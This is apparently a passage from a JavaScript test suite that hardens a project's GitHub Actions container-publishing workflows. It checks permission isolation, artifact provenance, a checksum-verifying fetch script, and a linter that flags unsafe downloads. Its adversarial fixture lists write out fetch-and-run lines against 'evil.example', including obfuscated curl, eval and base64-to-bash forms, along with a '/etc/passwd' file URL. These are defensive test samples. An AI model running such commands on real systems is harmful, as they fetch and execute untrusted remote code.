  assert.equal(upload.with.name, "oras-${{ inputs.platform == 'linux/amd64' && 'amd64' || 'arm64' }}-${{ inputs.artifact_id }}-${{ github.run_attempt }}");
  assert.equal(upload.with.overwrite, undefined);
  assert.equal(upload.id, "upload");
  assert.equal(publicationData()["oci-import"].jobs.tools.steps.find(s => s.id === "record").env.ARTIFACT_ID, "${{ steps.upload.outputs.artifact-id }}");
});

test("all image producers isolate unprivileged builds, verified digest import and native publication", () => assertPublicationGraph(publicationData()));

test("every publication shell snippet parses without executing any build or registry command", () => {
  for (const [name, data] of Object.entries(publicationData())) {
    for (const [where, script] of runScripts(data)) {
      const result = runBash(["--noprofile", "--norc", "-n"], { input: script, encoding: "utf8" });
      assert.equal(result.status, 0, `${name}: ${where}: ${result.stderr}`);
    }
  }
});

test("fixtures: publication graph refuses widened builders, wrong artifact/control provenance and premature tagging", () => {
  const original = publicationData();
  const mutations = [
    f => { f.image.jobs.build.permissions.packages = "write"; },
    f => { f["branch-images"].jobs.build.steps.find(s => actionName(s.uses) === "docker/build-push-action").with.provenance = false; },
    f => { f.image.jobs.publish.needs.pop(); },
    f => { f["loadtest-image"].jobs.import.with.artifact_id = "${{ inputs.artifact_id }}"; },
    f => { f["oci-import"].jobs.tools.permissions.packages = "write"; },
    f => { f["oci-import"].jobs.import.needs.pop(); },
    f => { f["oci-import"].jobs.preflight.steps.at(-2).if = "false"; },
    f => { f["oci-import"].jobs.import.steps.find(s => s.id === "stage")["continue-on-error"] = true; },
    f => { f["oci-import"].jobs.import.steps.find(s => actionName(s.uses) === "actions/checkout").with.ref = "${{ inputs.ref }}"; },
    f => { f["oci-import"].jobs.import.steps.find(s => actionName(s.uses) === "actions/download-artifact").with.pattern = "*"; },
    f => { const s = f["oci-import"].jobs.import.steps.filter(s => actionName(s.uses) === "actions/download-artifact"); s[1].with["artifact-ids"] = "${{ inputs.tool_artifact_id }}"; },
  ];
  assertPublicationGraph(original);
  for (const mutate of mutations) {
    const fixture = structuredClone(original);
    mutate(fixture);
    assert.throws(() => assertPublicationGraph(fixture), { name: "AssertionError" });
  }
});

const imageVerificationMutants = [
  ["no-op built-version check", f => { f.image.jobs.verify.steps.find(s => s.name === "Check the built version").run = "echo no-check"; }],
  ["optional verification job", f => { f.image.jobs.verify["continue-on-error"] = true; }],
  ["skipped verification and always-publish", f => { f.image.jobs.verify.if = "false"; f.image.jobs.publish.if = "always()"; }],
  ["both imports use AMD artifacts and digests", f => { Object.assign(f.image.jobs["import-arm64"].with, {
    artifact_id: "${{ needs.build.outputs.artifact_id_linux_amd64 }}", root_digest: "${{ needs.build.outputs.digest_linux_amd64 }}",
  }); }],
  ["ARM verifier uses AMD import", f => { Object.assign(f.image.jobs.verify.strategy.matrix.include[1], { import_job: "import-amd64", digest_output: "digest_linux_amd64" }); }],
  ["ARM publisher uses AMD digest", f => { f.image.jobs.publish.steps.find(s => s.id === "index").env.DIGEST_ARM64 = "${{ needs.import-amd64.outputs.digest_linux_amd64 }}"; }],
  ["optional version check", f => { f.image.jobs.verify.steps.find(s => s.name === "Check the built version")["continue-on-error"] = true; }],
  ["skipped version check", f => { f.image.jobs.verify.steps.find(s => s.name === "Check the built version").if = "false"; }],
  ["wrong revision comparison", f => { const s = f.image.jobs.verify.steps.find(s => s.name === "Check the built version"); s.run = s.run.replace('[ "${revision}" = "${SOURCE_REVISION}" ]', "true"); }],
  ["removed binary version comparison", f => { const s = f.image.jobs.verify.steps.find(s => s.name === "Check the built version"); s.run = s.run.replace('[ "${got}" != "open-model-gateway ${want}" ]', "false"); }],
  ["removed tag version comparison", f => { const s = f.image.jobs.verify.steps.find(s => s.name === "Check the built version"); s.run = s.run.replace('[ "${TAG%%-*}" != "v${want}" ]', "false"); }],
  ["wrong verifier digest expression", f => { f.image.jobs.verify.env.DIGEST = "${{ needs.import-amd64.outputs.digest_linux_amd64 }}"; }],
  ["wrong build output binding", f => { f.image.jobs.build.outputs.digest_linux_arm64 = "${{ steps.record.outputs.digest_linux_amd64 }}"; }],
  ["wrong build matrix architecture", f => { f.image.jobs.build.strategy.matrix.include[1].platform = "linux/amd64"; }],
  ["optional ARM import", f => { f.image.jobs["import-arm64"].if = "false"; }],
  ["optional publisher", f => { f.image.jobs.publish["continue-on-error"] = true; }],
  ["always-run native publication", f => { f.image.jobs.publish.steps.find(s => s.id === "index").if = "always()"; }],
];
for (const [name, mutate] of imageVerificationMutants) {
  test(`publication graph refuses ${name}`, () => {
    const fixture = publicationData();
    mutate(fixture);
    assert.throws(() => assertPublicationGraph(fixture), { name: "AssertionError" });
  });
}

// Run the actual workflow shell/Python snippets locally. No registry, build,
// credentials, stage-utility stand-in or executable transport binary is involved.
function handoffFixture() {
  const dir = mkdtempSync(join(tmpdir(), "oci-workflow-"));
  mkdirSync(join(dir, "image"));
  mkdirSync(join(dir, "tool"));
  symlinkSync(root, join(dir, "control"), "dir");
  const env = {
    ...process.env, RUNNER_TEMP: dir, GITHUB_ENV: join(dir, "env"),
    IMAGE_DIR: join(dir, "image"), TOOL_DIR: join(dir, "tool"),
    ARTIFACT_ID: "123", TOOL_ARTIFACT_ID: "456", ROOT_DIGEST: `sha256:${"a".repeat(64)}`,
    SOURCE_REVISION: "b".repeat(40), PLATFORM: "linux/amd64", IMAGE: "ghcr.io/ncecere/open-model-gateway",
  };
  delete env.GITHUB_TOKEN;
  delete env.GH_TOKEN;
  const run = (script, overrides = {}) => runBash(["--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script], {
    cwd: dir, env: { ...env, ...overrides }, encoding: "utf8",
  });
  return { dir, env, run, cleanup: () => rmSync(dir, { recursive: true, force: true }) };
}

test("actual importer selector guards reject alternate repos, tags, platforms, revisions and multi/invalid artifact IDs before download", () => {
  const data = publicationData()["oci-import"];
  const fixture = handoffFixture();
  try {
    for (const name of ["preflight", "import"]) {
      const script = stepsOf(data.jobs[name]).find(s => s.name === "Refuse invalid handoff selectors before download").run;
      for (const image of ["ghcr.io/ncecere/open-model-gateway", "ghcr.io/ncecere/open-model-gateway-loadtest"]) {
        const good = fixture.run(script, { IMAGE: image });
        assert.equal(good.status, 0, good.stderr);
      }
      const bad = [
        ...["", "0", "01", "-1", "1,2", "1 2", "1\n2", "1e2", "latest"].map(ARTIFACT_ID => ({ ARTIFACT_ID })),
        ...["ghcr.io/other/open-model-gateway", "ghcr.io/ncecere/open-model-gateway:latest", "ghcr.io/ncecere/open-model-gateway@sha256:x", "ghcr.io/ncecere/open-model-gateway/extra"].map(IMAGE => ({ IMAGE })),
        { PLATFORM: "linux/arm/v7" }, { PLATFORM: "linux/amd64,linux/arm64" },
        { ROOT_DIGEST: `sha256:${"A".repeat(64)}` }, { ROOT_DIGEST: "latest" },
        { SOURCE_REVISION: "main" }, { SOURCE_REVISION: "b".repeat(12) },
      ];
      if (name === "import") bad.push({ TOOL_ARTIFACT_ID: "123" }, { TOOL_ARTIFACT_ID: "456,789" }, { TOOL_ARTIFACT_ID: "" });
      for (const overrides of bad) {
        writeFileSync(fixture.env.GITHUB_ENV, "");
        assert.notEqual(fixture.run(script, overrides).status, 0, JSON.stringify(overrides));
        assert.equal(readFileSync(fixture.env.GITHUB_ENV, "utf8"), "", "refusal precedes artifact directory setup/download");
      }
    }
  } finally { fixture.cleanup(); }
});

// Reuse the existing bounded synthetic OCI graph builder, not a BuildKit proof.
function syntheticArchive(fixture, revision = fixture.env.SOURCE_REVISION, arch = "amd64") {
  const generator = `
import importlib.util, io, json, sys, tarfile
spec = importlib.util.spec_from_file_location("fixtures", sys.argv[1])
fixtures = importlib.util.module_from_spec(spec)
spec.loader.exec_module(fixtures)
graph = fixtures.fixture(sys.argv[4], edits={"config": lambda c: dict(c, config={"Labels": {"org.opencontainers.image.revision": sys.argv[3]}})})
with tarfile.open(sys.argv[2], "w", format=tarfile.USTAR_FORMAT) as archive:
    for name, data in graph["files"].items():
        info = tarfile.TarInfo(name)
        info.size = len(data)
        archive.addfile(info, io.BytesIO(data))
print(graph["root"]["digest"])
`;
  const result = spawnSync("python3", ["-I", "-", join(root, "tests/oci_layout_test.py"), join(fixture.env.IMAGE_DIR, "image.tar"), revision, arch], { input: generator, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
  return result.stdout.trim();
}

test("actual readonly preflight accepts bound synthetic graphs and refuses extra/hidden/missing/symlink data, wrong roots/platforms/revisions", () => {
  const script = publicationData()["oci-import"].jobs.preflight.steps.find(s => s.name === "Validate complete OCI graph and source revision without extraction").run;
  const fixture = handoffFixture();
  try {
    for (const arch of ["amd64", "arm64"]) {
      const digest = syntheticArchive(fixture, fixture.env.SOURCE_REVISION, arch);
      const good = fixture.run(script, { ROOT_DIGEST: digest, PLATFORM: `linux/${arch}` });
      assert.equal(good.status, 0, good.stderr);
    }
    const digest = syntheticArchive(fixture);
    const overrides = { ROOT_DIGEST: digest };
    for (const extra of ["unexpected", ".hidden", "oras"]) {
      const path = join(fixture.env.IMAGE_DIR, extra);
      writeFileSync(path, "not OCI content");
      assert.notEqual(fixture.run(script, overrides).status, 0, extra);
      rmSync(path);
    }
    for (const bad of [{ ROOT_DIGEST: fixture.env.ROOT_DIGEST }, { PLATFORM: "linux/arm64" }, { SOURCE_REVISION: "c".repeat(40) }]) {
      assert.notEqual(fixture.run(script, { ...overrides, ...bad }).status, 0, JSON.stringify(bad));
    }
    const image = join(fixture.env.IMAGE_DIR, "image.tar");
    rmSync(image);
    assert.notEqual(fixture.run(script, overrides).status, 0, "missing image");
    writeFileSync(join(fixture.dir, "outside"), "not an archive");
    symlinkSync(join(fixture.dir, "outside"), image);
    assert.notEqual(fixture.run(script, overrides).status, 0, "symlink image");
  } finally { fixture.cleanup(); }
});

test("actual writer validation refuses unexpected and tampered transport tools without executing them", () => {
  const script = publicationData()["oci-import"].jobs.import.steps.find(s => s.name === "Repeat graph and revision checks and verify static tool pin before credentials").run;
  const fixture = handoffFixture();
  try {
    const digest = syntheticArchive(fixture);
    const tool = join(fixture.env.TOOL_DIR, "oras");
    const marker = join(fixture.dir, "executed");
    writeFileSync(tool, `#!/bin/sh\nprintf stolen > '${marker}'\n`);
    chmodSync(tool, 0o755);
    const tampered = fixture.run(script, { ROOT_DIGEST: digest });
    assert.notEqual(tampered.status, 0);
    assert.match(tampered.stdout + tampered.stderr, /checksum|FAILED/);
    assert.equal(existsSync(marker), false);
    for (const extra of [".hidden", "extra"]) {
      writeFileSync(join(fixture.env.TOOL_DIR, extra), "unexpected");
      const result = fixture.run(script, { ROOT_DIGEST: digest });
      assert.notEqual(result.status, 0);
      assert.doesNotMatch(result.stdout + result.stderr, /checksum|FAILED/, "unexpected entries are refused even before checksum work");
      rmSync(join(fixture.env.TOOL_DIR, extra));
    }
    rmSync(tool);
    symlinkSync(join(fixture.env.IMAGE_DIR, "image.tar"), tool);
    assert.notEqual(fixture.run(script, { ROOT_DIGEST: digest }).status, 0);
    assert.equal(existsSync(marker), false);
  } finally { fixture.cleanup(); }
});

// ---- the fetch script ----

function runFetch(args, { curlBody, curlFails = false } = {}) {
  const dir = mkdtempSync(join(tmpdir(), "fetch-verified-"));
  try {
    // A stand-in curl on PATH: records its arguments and "downloads" a local file.
    const stub = join(dir, "bin");
    writeFileSync(join(dir, "args.log"), "");
    const body = join(dir, "body");
    writeFileSync(body, curlBody ?? "payload\n");
    const script = [
      "#!/usr/bin/env bash",
      `printf '%s\\n' "$*" >> '${join(dir, "args.log")}'`,
      curlFails ? "exit 22" : "",
      'out=""; while [ $# -gt 0 ]; do [ "$1" = "--output" ] && out="$2"; shift; done',
      `cp '${body}' "$out"`,
    ].join("\n");
    spawnSync("mkdir", ["-p", stub]);
    writeFileSync(join(stub, "curl"), script);
    chmodSync(join(stub, "curl"), 0o755);
    const dest = join(dir, "out", "tool");
    spawnSync("mkdir", ["-p", join(dir, "out")]);
    const resolved = args.map(a => (a === "DEST" ? dest : a));
    const r = runBash([join(root, FETCH_SCRIPT), ...resolved], { env: { ...process.env, PATH: `${stub}:${process.env.PATH}` }, encoding: "utf8" });
    return { ...r, dest, leftovers: readdirSync(join(dir, "out")), curlArgs: readFileSync(join(dir, "args.log"), "utf8"), cleanup: () => rmSync(dir, { recursive: true, force: true }) };
  } catch (e) {
    rmSync(dir, { recursive: true, force: true });
    throw e;
  }
}

const sha256 = body => runBash(["-c", `printf '%s' "$1" | (sha256sum 2>/dev/null || shasum -a 256) | cut -d' ' -f1`, "_", body], { encoding: "utf8" }).stdout.trim();
const GOOD_URL = "https://example.org/releases/tool.tar.gz";

test("fetch-verified.sh moves a download into place only after the checksum matches", () => {
  const r = runFetch([GOOD_URL, sha256("payload\n"), "DEST"]);
  try {
    assert.equal(r.status, 0, r.stderr);
    assert.equal(readFileSync(r.dest, "utf8"), "payload\n");
    assert.deepEqual(r.leftovers, ["tool"], "no temporary file is left next to the destination");
    for (const flag of ["--proto =https", "--proto-redir =https", "--fail"]) assert.ok(r.curlArgs.includes(flag), `curl gets ${flag}`);
    assert.ok(r.curlArgs.includes(GOOD_URL));
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh fails closed on a wrong checksum and leaves nothing at the destination", () => {
  const r = runFetch([GOOD_URL, "0".repeat(64), "DEST"]);
  try {
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /checksum/i);
    assert.equal(existsSync(r.dest), false);
    assert.deepEqual(r.leftovers, [], "the temporary file is removed too");
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh fails closed when the download fails", () => {
  const r = runFetch([GOOD_URL, sha256("payload\n"), "DEST"], { curlFails: true });
  try {
    assert.notEqual(r.status, 0);
    assert.equal(existsSync(r.dest), false);
    assert.deepEqual(r.leftovers, []);
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh accepts only an https URL, a 64-hex checksum and three arguments", () => {
  const sum = sha256("payload\n");
  const cases = {
    "http URL": ["http://example.org/x", sum, "DEST"],
    "file URL": ["file:///etc/passwd", sum, "DEST"],
    "ftp URL": ["ftp://example.org/x", sum, "DEST"],
    "option as URL": ["--output=/tmp/x", sum, "DEST"],
    "URL with a space": ["https://example.org/a b", sum, "DEST"],
    "short checksum": [GOOD_URL, sum.slice(0, 63), "DEST"],
    "uppercase checksum": [GOOD_URL, sum.toUpperCase(), "DEST"],
    "no destination": [GOOD_URL, sum],
    "extra argument": [GOOD_URL, sum, "DEST", "more"],
  };
  for (const [name, args] of Object.entries(cases)) {
    const r = runFetch(args);
    try {
      assert.notEqual(r.status, 0, name);
      assert.equal(r.curlArgs, "", `${name}: curl was never called`);
      assert.equal(existsSync(r.dest), false, name);
    } finally {
      r.cleanup();
    }
  }
});

test("fetch-verified.sh refuses to overwrite an existing destination", () => {
  const dir = mkdtempSync(join(tmpdir(), "fetch-verified-"));
  try {
    const dest = join(dir, "tool");
    writeFileSync(dest, "original");
    const r = runBash([join(root, FETCH_SCRIPT), GOOD_URL, sha256("payload\n"), dest], { encoding: "utf8" });
    assert.notEqual(r.status, 0);
    assert.equal(readFileSync(dest, "utf8"), "original");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("no workflow can switch the fetch script into a test mode", () => {
  assert.doesNotMatch(readFileSync(join(root, FETCH_SCRIPT), "utf8"), /\b(FETCH_VERIFIED_|TEST_MODE|ALLOW_INSECURE)/);
});

// ---- adversarial fixtures: the checks must catch these ----

const noLocal = () => null;
const violations = (text, readLocal = noLocal) => allWriteViolations([{ file: ".github/workflows/fixture.yml", text }], readLocal);
const localFiles = files => path => files[path] ?? null;

test("fixtures: write-job allowlist is exactly the three approved GitHub-owned actions (#374)", () => {
  assert.deepEqual([...WRITE_JOB_ACTIONS.keys()].sort(), [
    "actions/checkout", "actions/download-artifact", "github/codeql-action/upload-sarif",
  ]);
});

for (const action of ["docker/setup-buildx-action", "docker/login-action", "docker/build-push-action"]) {
  const step = `      - uses: ${action}@${SHA(1)} # v1\n`;
  for (const scope of ["contents", "packages", "id-token"]) {
    test(`fixtures: ${action} is rejected with ${scope}: write despite its SHA pin (#374)`, () => {
      const text = wf(`permissions: read-all\njobs:\n  writer:\n    permissions: {${scope}: write}\n    runs-on: ubuntu-24.04\n    steps:\n${step}`);
      assert.equal(violations(text).length, 1);
    });
  }
  test(`fixtures: ${action} is rejected with inherited write-all (#374)`, () => {
    const text = wf(`permissions: write-all\njobs:\n  writer:\n    runs-on: ubuntu-24.04\n    steps:\n${step}`);
    assert.equal(violations(text).length, 1);
  });
  test(`fixtures: ${action} in a local composite is rejected by a writer (#374)`, () => {
    const files = { ".github/actions/wrapper/action.yml": `name: wrapper\ndescription: fixture\nruns:\n  using: composite\n  steps:\n    - uses: ${action}@${SHA(1)} # v1\n` };
    const text = wf("permissions: {packages: write}\njobs:\n  writer:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/wrapper");
    assert.equal(violations(text, localFiles(files)).length, 1);
  });
  const caller = wf("permissions: write-all\njobs:\n  call:\n    uses: ./.github/workflows/child.yml");
  const child = `name: child\non: workflow_call\njobs:\n  build:\n    runs-on: ubuntu-24.04\n    steps:\n${step}`;
  test(`fixtures: ${action} in a reusable child inheriting a writer is rejected (#374)`, () => {
    assert.equal(violations(caller, localFiles({ ".github/workflows/child.yml": child })).length, 1);
  });
  test(`fixtures: ${action} remains allowed in a read-only job (#374)`, () => {
    const text = wf(`permissions: read-all\njobs:\n  build:\n    runs-on: ubuntu-24.04\n    steps:\n${step}`);
    assert.deepEqual(violations(text), []);
  });
  test(`fixtures: ${action} remains allowed when a reusable child explicitly downgrades to read-only (#374)`, () => {
    const downgraded = child.replace("    runs-on:", "    permissions: read-all\n    runs-on:");
    assert.deepEqual(violations(caller, localFiles({ ".github/workflows/child.yml": downgraded })), []);
  });
}

test("fixtures: a valid Buildx guard and image pin do not waive the writer action policy (#374)", () => {
  const text = wf(`permissions: {packages: write}\njobs:\n  writer:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: docker buildx version\n      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n        with:\n          driver-opts: image=moby/buildkit:v1@sha256:${"c".repeat(64)}\n`);
  assert.deepEqual(pinViolations(text, ".github/workflows/fixture.yml"), []);
  assert.deepEqual(buildxViolations(".github/workflows/fixture.yml", text), []);
  assert.equal(violations(text).length, 1);
});

for (const [action, scope] of [
  ["actions/checkout", "contents"],
  ["actions/download-artifact", "packages"],
  ["github/codeql-action/upload-sarif", "security-events"],
]) {
  test(`fixtures: approved ${action} remains allowed with ${scope}: write (#374)`, () => {
    const text = wf(`permissions: {${scope}: write}\njobs:\n  writer:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${action}@${SHA(1)} # v1`);
    assert.deepEqual(violations(text), []);
  });
}

test("fixtures: write-permission bypasses are caught", () => {
  const evil = "aquasecurity/trivy-action@master";
  // flow-style workflow (the reader this replaced skipped it)
  assert.ok(violations(`name: bypass\non: push\npermissions: {packages: write}\njobs: { evil: { runs-on: ubuntu-24.04, steps: [{ uses: ${evil} }] } }\n`).length);
  // an alias supplies the permissions
  assert.ok(violations(wf(`x-perm: &p {packages: write}\npermissions: *p\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // an alias supplies the steps, a merge key the whole job
  assert.ok(violations(wf(`x-steps: &s\n  - uses: ${evil}\npermissions: write-all\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps: *s`)).length);
  assert.ok(violations(wf(`x-job: &j\n  runs-on: ubuntu-24.04\n  permissions: {packages: write}\n  steps: [{uses: ${evil}}]\njobs:\n  evil:\n    <<: *j`)).length);
  // no permissions anywhere: the repository default token
  assert.ok(violations(wf(`jobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // write-all, at the workflow level and the job level
  assert.ok(violations(wf(`permissions: write-all\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  assert.ok(violations(wf(`permissions: read-all\njobs:\n  evil:\n    permissions: write-all\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // an empty block is not proof of read-only
  assert.ok(violations(wf(`jobs:\n  evil:\n    permissions:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // docker:// and an external reusable workflow
  assert.ok(violations(wf(`permissions: {contents: read}\njobs:\n  evil:\n    permissions: {packages: write}\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: docker://alpine@sha256:${"a".repeat(64)}`)).length);
  assert.ok(violations(wf(`permissions: {contents: read}\njobs:\n  evil:\n    permissions: {packages: write}\n    uses: other/repo/.github/workflows/x.yml@${SHA(1)}`)).length);
  // a local action path that escapes the repository, or does not exist
  assert.ok(violations(wf(`permissions: {packages: write}\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ../outside`)).length);
  assert.ok(violations(wf(`permissions: {packages: write}\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/missing`)).length);
});

test("fixtures: an action hidden in a local composite or a called workflow is caught", () => {
  const composite = `name: c\ndescription: d\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/inner\n`;
  const inner = `name: i\ndescription: d\nruns:\n  using: composite\n  steps:\n    - uses: aquasecurity/trivy-action@${SHA(2)} # v1\n`;
  const files = { ".github/actions/outer/action.yml": composite, ".github/actions/inner/action.yml": inner };
  const job = perms => wf(`${perms}\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/outer`);
  assert.equal(violations(job("permissions: {packages: write}"), localFiles(files)).length, 1);
  // the same composite is fine where the token is read-only
  assert.equal(violations(job("permissions: {contents: read}"), localFiles(files)).length, 0);
  // a composite of run steps only is fine next to a write token
  const plain = { ".github/actions/outer/action.yml": `name: c\ndescription: d\nruns:\n  using: composite\n  steps:\n    - run: echo hi\n      shell: bash\n` };
  assert.equal(violations(job("permissions: {packages: write}"), localFiles(plain)).length, 0);

  // a reusable workflow inherits what its caller grants
  const callee = `name: callee\non: workflow_call\njobs:\n  scan:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: aquasecurity/trivy-action@${SHA(3)} # v1\n`;
  const caller = grant => wf(`permissions: {contents: read}\njobs:\n  call:\n    permissions: ${grant}\n    uses: ./.github/workflows/callee.yml`);
  const reusable = { ".github/workflows/callee.yml": callee };
  assert.equal(violations(caller("{packages: write, id-token: write}"), localFiles(reusable)).length, 1);
  assert.equal(violations(caller("{contents: read}"), localFiles(reusable)).length, 0);
  // a callee that declares write is capped by a read-only caller
  const greedy = { ".github/workflows/callee.yml": callee.replace("jobs:", "permissions: {packages: write}\njobs:") };
  assert.equal(violations(caller("{contents: read}"), localFiles(greedy)).length, 0);
  assert.equal(violations(caller("{packages: write}"), localFiles(greedy)).length, 1);
});

test("fixtures: ordinary workflows pass", () => {
  const ok = `permissions: {contents: read}\njobs:\n  scan:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: aquasecurity/trivy-action@${SHA(4)} # v1\n      - uses: docker/login-action@${SHA(6)} # v1\n  push:\n    permissions: {contents: read, packages: write}\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@${SHA(5)} # v1\n      - run: echo native-publish\n  call:\n    permissions: {packages: write}\n    uses: ./.github/workflows/other.yml\n`;
  const readLocal = localFiles({ ".github/workflows/other.yml": "name: o\non: workflow_call\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo\n" });
  assert.equal(violations(wf(ok), readLocal).length, 0);
  const legacy = ok.replace("- run: echo native-publish", `- uses: docker/login-action@${SHA(6)} # v1`);
  assert.equal(violations(wf(legacy), readLocal).length, 1, "the former writer login must now be refused");
});

test("fixtures: the strict reader rejects what it cannot read safely", () => {
  assert.throws(() => parseStrict("name: x\nname: y\n", "dup.yml"), /dup\.yml/);
  assert.throws(() => parseStrict("name: [unclosed\n", "bad.yml"), /bad\.yml/);
  assert.throws(() => parseStrict("- a\n- b\n", "list.yml"), /mapping/);
  const bomb = ["a: &a [x, x, x, x, x, x, x, x, x, x]", ...Array.from("bcdefghij", (c, i) => `${c}: &${c} [${Array(10).fill("*" + "abcdefghi"[i]).join(", ")}]`), "z: [*j, *j, *j, *j, *j, *j, *j, *j, *j, *j]"].join("\n");
  assert.throws(() => toData(parseStrict(bomb, "bomb.yml")));
});

test("fixtures: unpinned references are caught wherever they are written", () => {
  const bad = refs => pinViolations(wf(`jobs:\n  j:\n    steps:\n${refs}`), "fixture.yml").length;
  assert.equal(bad(`      - uses: actions/checkout@v4 # v4`), 1);
  assert.equal(bad(`      - uses: actions/checkout@${SHA(1)}`), 1, "a SHA without a version comment");
  assert.equal(bad(`      - { uses: actions/checkout@${SHA(1)} }`), 1, "flow style cannot carry the comment");
  assert.equal(bad(`      - uses: docker://alpine:3`), 1);
  assert.equal(bad(`      - uses: &u actions/checkout@${SHA(1)} # v1\n      - uses: *u`), 1, "an alias cannot be checked");
  assert.equal(bad(`      - uses: \${{ env.ACTION }}`), 1);
  assert.equal(bad(`      - uses: actions/checkout@${SHA(1)} # v1\n      - uses: docker://alpine@sha256:${"b".repeat(64)}\n      - uses: ./.github/actions/x`), 0);
});

test("fixtures: Buildx downloads next to a write token are caught", () => {
  const job = (perms, steps) => wf(`jobs:\n  j:\n    runs-on: ubuntu-24.04\n    permissions: ${perms}\n    steps:\n${steps}`);
  const setup = extra => `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n        with:\n          driver-opts: image=mirror.gcr.io/moby/buildkit:v1@sha256:${"c".repeat(64)}\n${extra}`;
  const guard = `      - run: docker buildx version\n`;
  const check = (perms, steps) => buildxViolations("fixture.yml", job(perms, steps)).length;
  assert.equal(check("{packages: write}", setup("")), 1, "no guard step");
  assert.equal(check("{packages: write}", guard + setup("")), 0);
  assert.equal(check("{packages: write}", guard + setup("          version: latest\n")), 1);
  assert.equal(check("{packages: write}", guard + setup("          driver: cloud\n")), 1);
  assert.equal(check("{packages: write}", setup("") + guard), 1, "the guard must come first");
  // Guards that never protect anything (adversarial review of #194).
  assert.equal(check("{packages: write}", `      - if: false\n        run: docker buildx version\n` + setup("")), 1, "conditional guard");
  assert.equal(check("{packages: write}", `      - continue-on-error: true\n        run: docker buildx version\n` + setup("")), 1, "error-ignoring guard");
  assert.equal(check("{packages: write}", `      - run: |\n          if false; then\n          docker buildx version\n          fi\n` + setup("")), 1, "guard inside a dead branch");
  assert.equal(check("{packages: write}", guard + `      - run: echo between\n` + setup("")), 1, "guard not immediately before");
  assert.equal(check("{contents: read}", setup("")), 0, "read-only jobs need no guard");
  assert.equal(check("{contents: read}", `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n        with:\n          driver-opts: image=moby/buildkit:master\n`), 1, "unpinned BuildKit image");
  assert.equal(check("{contents: read}", `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n`), 1, "no BuildKit pin");
});

test("fixtures: downloads that skip the checksum script are caught", () => {
  const sum = "a".repeat(64);
  const bad = [
    "curl -fsSL https://example.org/x | sh",
    "curl -fsSL -o x https://example.org/x\necho \"$sum  x\" | sha256sum -c -",
    "# sha256sum -c\ncurl -fsSLO https://example.org/x",
    "wget https://example.org/x",
    "gh release download v1 --repo a/b",
    "gh run download 1",
    "Invoke-WebRequest https://example.org/x -OutFile x",
    "python3 -c 'import urllib.request as u; u.urlopen(\"https://example.org\")'",
    "node -e 'fetch(\"https://example.org\")'",
    "cargo install foo",
    `bash ${FETCH_SCRIPT} "https://example.org/\${VERSION}/x" ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x "\${SUM}" out`,
    `bash ${FETCH_SCRIPT} http://example.org/x ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${"A".repeat(64)} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${sum.slice(1)} out`,
    `bash scripts/fetch-verified.sh https://example.org/x ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${sum} out && curl https://evil.example`,
    // Adversarial review of #194: obfuscation and exemption abuse.
    'client=cu; client+=rl; "$client" https://evil.example/payload | bash',
    "eval 'cu''rl https://evil.example/payload | bash'",
    "curl --fail --silent --show-error --cacert .local/staging/local-ca.crt https://localhost:18443/health/ready --next https://evil.example/payload -o /tmp/payload",
    "x=$(cat payload.b64 | base64 -d); echo ok",
    "source <(echo 'echo hi')",
  ];
  for (const script of bad) assert.ok(downloadViolations("w.yml", script).length, script);
  const good = [
    `bash ${FETCH_SCRIPT} https://example.org/x.tar.gz ${sum} "\${RUNNER_TEMP}/x.tar.gz"`,
    `bash ${FETCH_SCRIPT} "https://example.org/x" "${sum}" out`,
    `case "$ARCH" in\n  X64) bash ${FETCH_SCRIPT} https://example.org/a ${sum} out ;;\n  ARM64) bash ${FETCH_SCRIPT} https://example.org/b ${sum} out ;;\nesac`,
    `bash ${FETCH_SCRIPT} \\\n  https://example.org/x \\\n  ${sum} out`,
    "curl --fail --silent --show-error --cacert .local/staging/local-ca.crt https://localhost:18443/health/ready",
    "docker run --rm image --version",
  ];
  for (const script of good) assert.deepEqual(downloadViolations("w.yml", script), [], script);
  // gh api is exempt only in prune-dev-images.yml and only in its two exact shapes.
  const prune = ".github/workflows/prune-dev-images.yml";
  assert.deepEqual(downloadViolations(prune, `versions="$(gh api --paginate "/users/$OWNER/packages/container/$package/versions?per_page=100" | jq -s 'add // []')"`), []);
  assert.deepEqual(downloadViolations(prune, `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`), []);
  assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content | base64 -d | bash").length);
